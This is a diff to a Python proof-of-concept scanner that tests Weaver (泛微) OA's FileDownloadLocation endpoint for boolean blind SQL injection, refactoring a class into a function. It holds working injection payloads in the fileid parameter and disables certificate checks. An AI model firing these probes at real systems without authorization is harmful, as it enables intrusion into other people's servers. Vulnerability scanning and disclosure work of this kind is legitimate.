@@ -9,14 +9,7 @@ description: fileid参数引起的布尔盲注。
 import sys
 import requests
 import warnings
-  
-
-
-class download_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['泛微OA filedownaction SQL注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -25,11 +18,11 @@ class download_sqli:
         false_url = r"/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-1/**/Or/**/1=2"
 
         try:
-            req1 = requests.get(self.url+true_url, headers=headers, timeout=10, verify=False)
-            req2 = requests.get(self.url+false_url, headers=headers, timeout=10, verify=False)
+            req1 = requests.get(url+true_url, headers=headers, timeout=10, verify=False)
+            req2 = requests.get(url+false_url, headers=headers, timeout=10, verify=False)
             if r"attachment" in str(req1.headers) and r"attachment" not in str(req2.headers):
                 result[2]=  '存在'
-                result[1]=self.url+true_url
+                result[1]=url+true_url
             else:
                 result[2]=  '不存在'
 
@@ -39,5 +32,4 @@ class download_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = download_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
